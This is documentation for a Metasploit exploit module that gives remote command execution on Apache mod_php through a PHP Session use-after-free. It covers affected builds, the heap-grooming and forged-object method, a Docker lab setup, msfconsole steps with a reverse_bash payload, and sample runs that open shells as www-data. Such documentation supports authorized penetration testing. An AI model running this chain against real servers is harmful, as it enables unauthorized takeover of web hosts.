## Vulnerable Application

PHP versions before 8.2.35, 8.3.36, 8.4.27, and 8.5.12 are affected by
CVE-2026-109618 and CVE-2026-109619. The PHP project also supplied source
backports for older branches.

Targets 0 and 1 use an in-process Ruby chain for the validated x86-64 official
PHP 8.2.33, 8.2.34, 8.3.32, 8.3.33, 8.3.35, 8.3.35 Apache Bookworm,
8.4.10, 8.4.13, 8.4.15, 8.4.16,
8.4.18, 8.4.20, 8.4.21, 8.4.23, 8.4.24,
8.4.25, and 8.4.26 Apache images, Debian 12's `libapache2-mod-php8.2`
`8.2.29-1~deb12u1`, `8.2.31-1~deb12u1`, and `8.2.32-1~deb12u1` packages, and
Debian 13's `libapache2-mod-php8.4` `8.4.21-1~deb13u1`, `8.4.23-1~deb13u1`, and
`8.4.24-1~deb13u1` packages. Both targets require a 128
MiB `memory_limit`, files Session storage, and production-shaped Session
upload-progress and multipart input settings. A matching version banner alone
is not sufficient. The terminal is not sent unless a live disclosure confirms
a registered callback, bucket-count, and process-layout signature.

The official PHP 8.2 and PHP 8.3 profiles require a 26-byte generated Session
ID and a writable files Session directory. The module measures the generated ID before A0 and
safely rejects the stock 32-byte configuration until its distinct B0 family is
supported.

The selected route only needs to be parsed by PHP; its application does not
need to use Sessions or handle uploaded files.

The Debian package profile validated in the KVM lab is:

| Target | Package | ELF build ID |
| --- | --- | --- |
| 0 and 1 | Debian 12 `libapache2-mod-php8.2` `8.2.29-1~deb12u1` | `27f1b2cfb56e30e90a0fa4cf6f55a819f950330a` |
| 0 and 1 | Debian 12 `libapache2-mod-php8.2` `8.2.31-1~deb12u1` | `944e0e1c94e336136099efcf2e51b6c851239876` |
| 0 and 1 | Debian 12 `libapache2-mod-php8.2` `8.2.32-1~deb12u1` | `b300db464600ecc6a578540e2f3cd0c994b917fe` |
| 0 and 1 | Docker Official PHP `8.2.33-apache` | `d154d0c9775f815066e663e7d2c6116a2ada8ab9` |
| 0 and 1 | Docker Official PHP `8.2.34-apache` | `432b9cdfc44ab0205ee9f81d234d14e474e9aeb6` |
| 0 and 1 | Docker Official PHP `8.3.32-apache` | `9d6072e00237f857a132574e11a6de24ee57bcfc` |
| 0 and 1 | Docker Official PHP `8.3.33-apache` | `a18bc5e602bcdc1d610d2f4c28aa353108514671` |
| 0 and 1 | Docker Official PHP `8.3.35-apache` | `6750eb9dbdf140fb6f76592d078784272ec1c7ca` |
| 0 and 1 | Docker Official PHP `8.3.35-apache-bookworm` | `d05c8f31559372bc98543dd69f7da04c439bd29c` |
| 0 and 1 | Debian 13 `libapache2-mod-php8.4` `8.4.21-1~deb13u1` | `ac642ad41e37df06b9725c077f44e4d28eb3ebe6` |
| 0 and 1 | Debian 13 `libapache2-mod-php8.4` `8.4.23-1~deb13u1` | `872984eac28438a29280a5e277871e069335ffca` |
| 0 and 1 | Debian 13 `libapache2-mod-php8.4` `8.4.24-1~deb13u1` | `a53126ca5ef3f1c12e9bd48cf7cccd63698fc818` |

The module derives the heap and terminal carrier from each live disclosure.
Debian 12 and PHP 8.3 use the registered callback-to-
`zend_vm_set_opcode_handler` relation and a setter/EVAL terminal; the PHP 8.4
profiles use a registered callback-to-`zif_system` relation. A package update
or rebuild needs a new profile even when it remains on the same PHP minor
branch. Fedora profiles are not registered because their production terminal
allocation lifecycle has not been validated in the in-process implementation.

The official-image profiles use the effective `zval_ptr_dtor` and
`zif_system` offsets published and independently validated during PR 22036's
calibration work. PHP 8.4.15, 8.4.16, and 8.4.18 point eleven bytes into the
destructor symbol, so the effective pointer is used rather than its ELF symbol
start. Debian 12 PHP 8.2.29 has the same effective callback form. PHP 8.5.11 is not registered: under this production
configuration its B1 request does not reproduce the public single-worker,
8 MiB calibration.

The validated image digest is:

```
php@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a
```

The validated PHP 8.2/8.3 image digests are
`php@sha256:db8c1de3582265741f70ace2278f5c947c60c3ceee9d32cd20f9c0f33f8cce45`
for 8.2.33,
`php@sha256:1650dcb528360aad05d6ed2f83cb403a2a39c31bd14552efd9a747b2207dea86`
for 8.2.34,
`php@sha256:a05f87f7f1e3927b9f3a44d64c01dfe15992328fa179bdfa72ad06e66769ff57`
for 8.3.32,
`php@sha256:20e0ce3bd9bcb9db5fd7d141577e87db2eb0b20ea7c70403a4242198a02db4b2`
for 8.3.33 and
`php@sha256:c59c808172ee3672cd334f8f2a5d7b1480a9d7273a368f412b8ee9b4ef418184`
for 8.3.35. The `8.3.35-apache-bookworm` image digest is
`php@sha256:cf2be6b00bfbf09563001476d80f8629ba196dd94a1bb4b2a057acc689645583`.
Add `session.sid_length = 26` and a writable `session.save_path` such as `/tmp`
to its production INI.

### Exploit Method

The module targets long-lived Apache prefork children running `mod_php`.
Multipart request startup can exhaust PHP's 128 MiB memory limit after Session
upload-progress machinery has installed global state. The request aborts
through an exceptional out-of-memory path that does not completely clear this
state. Because a prefork child handles many requests in one process, a later
request reaching the same worker can reclaim objects referenced by dangling
Session pointers. The module converts that use-after-free into a memory
disclosure, identifies a calibrated build layout, then reclaims the stale value
with a forged object graph that invokes a command-execution function.

Here, reclaiming means controlled heap reuse. After the OOM path frees a
Session value, PHP retains a reference to its former location. A subsequent
request creates many carefully sized multipart variables, encouraging Zend's
allocator to place controlled bytes in that freed slot. PHP then interprets
the bytes through the stale reference. Since Zend values contain type metadata,
counts, callbacks, and pointers to other structures, the module constructs a
self-consistent graph rather than a single fake object. The live memory
disclosure supplies the absolute addresses required by these pointers despite
ASLR.

Before exploitation, AutoCheck calls `check`, which performs a health request
and reads the Apache/PHP banner. Patched releases are rejected, supported
vulnerable versions are allowed, and a hidden version is detected because the
live leak remains authoritative. `exploit` validates the payload and limits,
repeats preflight if required, and delegates to `run_selected_engine`.
`InProcess` uses the reported version, `Generic` clears that hint and identifies
a registered profile from memory, while `Automatic` tries a registered version
path first and changes to `Generic` only after a pre-terminal failure. Generic
retries use independently fenced attempts, but no mode retries after terminal
bytes may have executed.

All branches build a worker fence. They open many partial
`Expect: 100-continue` requests, hold each acknowledged connection, and feed
those connections so every prefork worker remains occupied. This leaves one
selected connection bound to the worker carrying stale state. Audits catch
workers that start late or retire, and handoff requests preserve affinity when
Apache closes a connection after an error. Releasing one holder provides a
controlled writer when the chain needs a second role.

For PHP 8.2 and 8.3, the module first requires a 26-byte generated Session ID.
A0 establishes the reset-ID/OOM transition and measures the worker pool. B0
reclaims the Session value as a `0x180000`-byte string returned through
`Set-Cookie`. `php_8_2_parse_bootstrap` analyzes heap pointers, nested
HashTables, callback signatures, allocation carriers, and terminal anchors. It
selects a registered profile from the callback signature and calculates such
values as the fake-object address and the address of
`zend_vm_set_opcode_handler`.

`php_8_2_eval_graph` then constructs a fake Zend object and class entry
containing a forged `__sleep` method. The method is backed by a fake
function/op-array, runtime cache, opcode, literal, and PHP source string. The
source effectively executes `system(base64_decode(payload)); exit;`.
`php_8_2_terminal_material` surrounds this with a parent HashTable and a setter
object. When Session processing traverses the parent, the setter establishes
the opcode handler. Processing the second object subsequently invokes the
forged `__sleep` method and evaluates the embedded source. PHP 8.2 and PHP 8.3
have different offsets for fields inside these structures, so the selected
profile supplies the appropriate ABI.

Before that graph is triggered, the q-close phase redirects the selected
child's error log into its client connection, allowing the module to distinguish
and reacquire the correct worker. Persist leaves stale Session state,
`poison_decoder` corrupts the decoder, and a writer seeds the final Session
record. Debian PHP 8.2 uses a completed record; official PHP 8.2/8.3 keeps a
live request. Finally, another multipart suffix causes OOM while the forged
graph remains reachable.

PHP 8.4 uses a more direct four-stage schedule. A1 creates the OOM and stale
global state. B1 replaces it with a `0xc8000`-byte disclosed string.
`parse_leak` counts repeated pointers and address-bucket signatures to
calculate the ASLR-adjusted addresses of `zif_system` and a predictable
terminal allocation. A2 then creates the stale Session value needed for the
terminal.

B2 sprays 384-byte strings containing repeated fake `zend_reference`
structures pointing to that predicted allocation. It also allocates a fake
HashTable whose element-destructor callback is `zif_system`. Other overlapping
fields make the destructor argument appear to be the expected execution
context and a valid Zend string containing the payload command. PHP eventually
processes the reclaimed stale value, follows the forged HashTable's destructor
pointer, and calls `zif_system` with that command. If any disclosure or profile
validation fails, the module stops before sending these terminal bytes.

### Exploit Flow

Each box names the method or control path first and then summarizes what it
does. A reported PHP version is only a routing hint; both families require a
matching live-disclosure signature before sending terminal state.

```mermaid
flowchart TD
  subgraph Entry["Shared entry and engine selection"]
    AC["AutoCheck#exploit<br/>Runs the target check before allowing exploitation."] --> CHECK["MetasploitModule#check<br/>Calls preflight_health and classifies the Apache/PHP response."]
    CHECK -->|"Appears or Detected"| EXP["MetasploitModule#exploit<br/>Coordinates validation, engine selection, error handling, and cleanup."]
    CHECK -->|"Safe, Unsupported, or Unknown"| STOP["AutoCheck#exploit failure path<br/>Aborts unless ForceExploit explicitly permits continuation."]
    EXP --> VALIDATE["MetasploitModule#exploit validation<br/>Rejects unsafe payload bytes and invalid operational limits."]
    VALIDATE --> PREFLIGHT["preflight_health<br/>Confirms HTTP 200 and records the reported PHP version when needed."]
    PREFLIGHT --> SELECT["run_selected_engine<br/>Dispatches the command according to ExploitEngine."]

    SELECT -->|"InProcess"| CHAIN["run_exploit_chain<br/>Chooses and executes one PHP-family exploit chain."]
    SELECT -->|"Generic"| GENERIC["run_generic_engine<br/>Clears the version hint and retries live-signature profile selection."]
    SELECT -->|"Automatic"| AUTO["run_in_process_with_generic_fallback<br/>Uses a registered version path before allowing generic fallback."]
    AUTO --> REGISTERED{"php_session_uaf_registered_version?<br/>Tests whether the reported version has a version-specific profile."}
    REGISTERED -->|"yes"| CHAIN
    REGISTERED -->|"no"| GENERIC
    AUTO -.->|"pre-terminal error only"| RELEASE["stop_fence<br/>Releases all held workers before another complete attempt."]
    RELEASE --> GENERIC
    GENERIC -->|"attempt 1..GenericAttempts"| CHAIN
    CHAIN -.->|"pre-terminal failure in Generic"| RELEASE
    CHAIN -.->|"terminal started; never retry"| TERMINAL_ERROR["MetasploitModule#exploit TerminalError rescue<br/>Reports PayloadFailed while warning that the command may have run."]
  end

  subgraph Routing["run_exploit_chain: select a PHP family"]
    CHAIN --> HINT["php_session_uaf_profile_hint<br/>Returns the banner version or nil when Generic must use only the leak."]
    HINT -->|"registered PHP 8.2/8.3 banner"| SID["php_8_2_probe_session_sid_length<br/>Measures whether the target generates the required 26-byte Session ID."]
    HINT -->|"registered PHP 8.4 banner"| P84["run_php_8_4_chain<br/>Executes the A1/B1/A2/B2 stale-HashTable chain."]
    HINT -->|"hidden version or Generic mode"| SID_GENERIC["php_8_2_probe_session_sid_length<br/>Uses Session-ID length to choose a family without trusting a banner."]
    HINT -->|"other exact banner with forced InProcess"| P84
    SID -->|"26 bytes"| P823["run_php_8_2_chain<br/>Executes the A0/B0 stale-decoder and setter/EVAL chain."]
    SID -->|"not 26 bytes"| REJECT["run_exploit_chain or disclosure parser<br/>Raises ExploitError before terminal state when an invariant or signature fails."]
    SID_GENERIC -->|"26 bytes"| P823
    SID_GENERIC -->|"other length"| P84
  end

  subgraph PHP823["PHP 8.2/8.3 chain"]
    P823 --> FENCE823["start_fence and selected_actor<br/>Pins A0 to one worker while reserving the remaining prefork children."]
    FENCE823 --> A0["php_8_2_build_a0_body and fence_audit<br/>Establishes the reset-ID/OOM transition and measures the worker pool."]
    A0 --> B0MODE{"php_8_2_response_closed?<br/>Determines whether B0 can reuse the A0 connection."}
    B0MODE -->|"no: reuse actor"| B0["php_8_2_build_b0_body and php_8_2_read_response<br/>Reclaims and returns the Session value as a memory disclosure."]
    B0MODE -->|"yes: up to 12 handoffs"| B0
    B0 --> PARSE823["php_8_2_parse_bootstrap<br/>Verifies the live profile and derives heap, callback, carrier, and anchor addresses."]
    PARSE823 --> MATERIAL823["php_8_2_terminal_material<br/>Constructs the setter/EVAL graph using the selected PHP ABI."]
    MATERIAL823 --> BIND["php_8_2_bind_error_log<br/>Uses q-close to redirect errors and reacquire the selected worker."]
    BIND --> PERSIST["php_8_2_persist_record<br/>Leaves the selected child holding stale Session state."]
    PERSIST --> DECODER["php_8_2_poison_decoder<br/>Reclaims the decoder and forces its startup bailout."]
    DECODER --> WRITER["php_8_2_release_writer<br/>Converts a fenced worker into the terminal Session writer."]
    WRITER --> SEED{"run_php_8_2_chain terminal_seed branch<br/>Selects the Session-record lifecycle required by the live profile."}
    SEED -->|"finished: Debian 12 PHP 8.2.29/.31/.32"| FINISHED["php_8_2_seed_finished_session<br/>Creates a completed terminal record and reopens a writer pin."]
    SEED -->|"live: official PHP 8.2.33/.34 and 8.3.32/.33/.35"| LIVE["php_8_2_begin_live_seed<br/>Creates the terminal record while retaining its live writer."]
    FINISHED --> TERM823["php_8_2_send_oom_suffix<br/>Makes the setter/EVAL graph reachable and executes the encoded command."]
    LIVE --> TERM823
  end

  subgraph PHP84["PHP 8.4 chain"]
    P84 --> FENCE84["start_fence and selected_actor<br/>Pins A1 to one worker while reserving the remaining prefork children."]
    FENCE84 --> A1["build_a1_body and finish_chunked_stage<br/>Creates the initial OOM and stale global Session state."]
    A1 --> B1["next_actor and build_b1_body<br/>Reclaims the stale value as a controlled memory disclosure."]
    B1 --> PARSE84["parse_leak<br/>Verifies the live callback, address buckets, and process-layout profile."]
    PARSE84 --> A2["next_actor and build_a2_body<br/>Produces the stale Session value consumed by the terminal request."]
    A2 --> B2["next_actor and build_b2_body<br/>Builds reference sprays and the fake HashTable containing the command."]
    B2 --> TERM84["begin_b2 and send_chunked_body<br/>Finishes the terminal request so destruction of the fake HashTable calls zif_system."]
  end

  PARSE823 -->|"signature mismatch"| REJECT
  PARSE84 -->|"signature mismatch"| REJECT
  TERM823 --> PAYLOAD["Metasploit payload handler<br/>Waits for the command to establish its configured payload channel."]
  TERM84 --> PAYLOAD

  classDef entry fill:#e8f1ff,stroke:#2b5da8,color:#111;
  classDef php823 fill:#fff1db,stroke:#a86400,color:#111;
  classDef php84 fill:#e9f8ed,stroke:#2e7d45,color:#111;
  classDef terminal fill:#fbe7e7,stroke:#a33131,color:#111;
  class AC,CHECK,EXP,VALIDATE,PREFLIGHT,SELECT,AUTO,REGISTERED,GENERIC,RELEASE,CHAIN entry;
  class P823,FENCE823,A0,B0MODE,B0,PARSE823,MATERIAL823,BIND,PERSIST,DECODER,WRITER,SEED,FINISHED,LIVE php823;
  class P84,FENCE84,A1,B1,PARSE84,A2,B2 php84;
  class TERM823,TERM84,TERMINAL_ERROR,STOP,REJECT terminal;
```



### Setup

An isolated lab can be prepared with Docker:

```
IMAGE=php@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a
docker create --name php2shell-ini "$IMAGE"
docker cp php2shell-ini:/usr/local/etc/php/php.ini-production ./php.ini
docker rm php2shell-ini
mkdir -p www
printf '%s\n' '<?php echo "OK\\n";' > www/index.php
docker run --rm --name php2shell --publish 8088:80 \
  --mount type=bind,source="$(pwd)/php.ini",target=/usr/local/etc/php/php.ini,readonly \
  --mount type=bind,source="$(pwd)/www",target=/var/www/html "$IMAGE"
```

`php.ini-production` normally exposes the PHP version. The exploit also has a
separate strict response-layout signature for `expose_php=Off`.

## Verification Steps

1. Start a vulnerable container using the commands above.
1. Start `msfconsole`.
1. Run `use exploit/linux/http/cve_2026_109618`.
1. Run `set RHOSTS 127.0.0.1`.
1. Run `set RPORT 8088`.
1. Run `set TARGETURI /index.php`.
1. Run `set PAYLOAD cmd/unix/reverse_bash`.
1. Set `LHOST` to an address reachable from the target.
1. Run `set VERBOSE true`.
1. Run `exploit`.
1. A command shell should open as the web worker account.

For a server that hides its PHP version, set `ForceExploit true`. The exploit
still requires a complete live signature match before sending its terminal
request. Every mode executes entirely in Ruby inside Metasploit.
`ExploitEngine Generic` broadens live-profile matching within the reported PHP
minor branch and uses the expanded Ruby recovery schedule. `ExploitEngine
Automatic` uses that strategy when the version-specific path is unavailable
or fails before terminal execution. An unregistered build that matches none of
the registered live signatures exits before command execution. Automatic mode
never falls back after a terminal-stage failure.

The Linux Command Fetch target writes its executable to `/tmp`. Apache workers
normally cannot write to the application root used as their current directory.

Do not retry an invocation that reached the terminal request. An apparent
terminal failure can occur after the payload already ran.

## Options

### ExploitEngine

`InProcess` trusts the reported version to narrow the registered Ruby profiles
and remains the default. `Generic` broadens live-profile matching only within
the reported minor branch while using the larger PHP 8.2 handoff and
preterminal recovery schedule. `Automatic` first uses the version-specific
selection and repeats the Ruby chain with version-independent live-profile
selection only after a provably pre-terminal failure. Every mode uses Framework
sockets, including Framework routes where the byte-preserving transport itself
is supported. `Generic` is not a general resolver for unknown binary layouts.

### GenericAttempts

The maximum number of complete, independently fenced Ruby attempts used by
`Generic` and by the fallback portion of `Automatic`. Only preterminal errors
are retried. Each PHP 8.2 recovery attempt also permits up to twelve fresh
q-close handoffs. The default is 24.

### AFFINITY_LIMIT

The maximum number of accepted and pending fence connections. Increase this
only for a larger prefork deployment. Reaching the bound aborts before the
terminal. The default is 512.

### FENCE_WIDTH

The number of unassigned requests retained across each worker handoff. These
requests make the next stage follow the selected worker through a direct TCP
path or a byte-preserving layer-4 frontend. The default is 64.

### AFFINITY_SETTLE

The quiet interval after the last newly accepted worker before the prefork
population is considered complete. The default is 10 seconds so production
VMs with gradual prefork spawning reach their configured worker limit.

### TRAFFIC_AUDIT_SECONDS

The quiet interval required before each active stage advances. Increase it on
a busy server so late workers become holders before the terminal request. A
longer interval proportionally increases runtime. The default is 2 seconds.

### STAGE_TIMEOUT

The response timeout for individual OOM and disclosure stages. The default is
60 seconds.

## Scenarios

### Docker Official PHP 8.4.26 Apache, stock prefork pool

The following output was captured with the image and production INI described
above. Addresses and routing ports have been sanitized.

```
msf > use exploit/linux/http/cve_2026_109618
msf exploit(linux/http/cve_2026_109618) > set payload cmd/unix/reverse_bash
payload => cmd/unix/reverse_bash
msf exploit(linux/http/cve_2026_109618) > set rhosts 192.0.2.10
RHOSTS => 192.0.2.10
msf exploit(linux/http/cve_2026_109618) > set verbose true
VERBOSE => true
msf exploit(linux/http/cve_2026_109618) > run
[*] Started reverse TCP handler on 192.0.2.20:5557
[*] 192.0.2.10:8088 - Running automatic check ("set AutoCheck false" to disable)
[+] 192.0.2.10:8088 - The target appears to be vulnerable. Target reports Apache with PHP 8.4.26; exploitation will verify a registered mod_php layout
[*] 192.0.2.10:8088 - Measured 150 Apache prefork workers (149 late workers)
[+] 192.0.2.10:8088 - A1 produced the expected OOM (211 response bytes)
[+] 192.0.2.10:8088 - B1 verified a compatible mod_php official PHP 8.4.26 expose_php=On layout: callback=0x7ac337148b60, main=0x7ac334e00000
[+] 192.0.2.10:8088 - A2 produced the stale Session value (211 response bytes)
[*] 192.0.2.10:8088 - Triggering the one-shot payload after catching 0 late workers
[*] 192.0.2.10:8088 - Terminal request was sent; Metasploit will wait for the payload handler
[*] Command shell session 1 opened

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uname -a
Linux php2shell 7.0.0-1017-azure #17~24.04.1-Ubuntu SMP PREEMPT x86_64 GNU/Linux
```

### Debian 13 PHP 8.4.24 Apache mod_php

The following output was captured against the Debian 13 package container
above using target 0. Runtime addresses and routing ports have been sanitized.

```
msf exploit(linux/http/cve_2026_109618) > set ForceExploit true
ForceExploit => true
msf exploit(linux/http/cve_2026_109618) > set VERBOSE true
VERBOSE => true
msf exploit(linux/http/cve_2026_109618) > run
[*] Started reverse TCP handler on 192.0.2.20:45551
[*] 192.0.2.10:80 - Running automatic check ("set AutoCheck false" to disable)
[!] 192.0.2.10:80 - The service is running, but could not be validated. Apache endpoint is reachable, but the exact PHP build is hidden
[*] 192.0.2.10:80 - Measured 150 Apache prefork workers (149 late workers)
[+] 192.0.2.10:80 - A1 produced the expected OOM (185 response bytes)
[+] 192.0.2.10:80 - B1 verified a compatible mod_php Debian 13 libapache2-mod-php8.4 8.4.24-1~deb13u1 layout: callback=0x7fdca6525ff0, main=0x7fdca5000000
[+] 192.0.2.10:80 - A2 produced the stale Session value (185 response bytes)
[*] 192.0.2.10:80 - Triggering the one-shot payload after catching 0 late workers
[*] 192.0.2.10:80 - Terminal request was sent; Metasploit will wait for the payload handler
[*] Command shell session 1 opened

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uname -a
Linux php2shell-modphp 6.12.113+deb13-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
```

### Debian 12 PHP 8.2.32 Apache mod_php

The following output was captured against the exact Debian 12 package using
target 0. Runtime addresses and routing ports have been sanitized.

```
[!] 192.0.2.10:80 - The service is running, but could not be validated. Apache endpoint is reachable, but the exact PHP build is hidden
[*] 192.0.2.10:80 - Measured a 26-byte generated Session ID
[*] 192.0.2.10:80 - Generated Session ID length selects the Debian 12 libapache2-mod-php8.2 8.2.32-1~deb12u1 engine
[*] 192.0.2.10:80 - Measured 150 Apache prefork workers (149 late workers)
[+] 192.0.2.10:80 - Debian 12 A0 produced the expected OOM (185 response bytes)
[+] 192.0.2.10:80 - B0 verified Debian 12 libapache2-mod-php8.2 8.2.32-1~deb12u1
[+] 192.0.2.10:80 - Bound the selected Debian 12 child error log to its client connection
[+] 192.0.2.10:80 - Debian 12 persist request left stale Session state (398 response bytes)
[+] 192.0.2.10:80 - Debian 12 poisoned the selected Session decoder (601 response bytes)
[+] 192.0.2.10:80 - Debian 12 writer produced the terminal Session record (185 response bytes)
[*] 192.0.2.10:80 - Terminal request was sent; Metasploit will wait for the payload handler
[*] Command shell session 1 opened

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uname -a
Linux php2shell-bookworm 6.1.0-54-cloud-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
```
